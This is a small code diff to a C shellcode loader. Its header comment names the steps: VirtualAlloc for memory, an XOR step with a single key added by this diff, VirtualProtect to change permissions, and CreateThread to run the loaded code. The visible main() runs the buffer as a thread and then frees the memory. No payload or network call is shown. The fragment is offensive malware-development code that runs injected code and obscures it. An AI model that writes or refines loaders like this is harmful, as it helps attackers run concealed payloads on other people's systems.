@@ -9,6 +9,7 @@ Compile:
 
 Technique:
     - allocation: VirtualAlloc
+    - writing:    XOR with single key
     - permission: VirtualProtect
     - execution:  CreateThread
 */
@@ -65,6 +66,8 @@ int main ()
         th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
         WaitForSingleObject (th_shellcode, -1);
     }
+
+    VirtualFree (runtime, payload_len, MEM_RELEASE);
 
     return 0;
 }
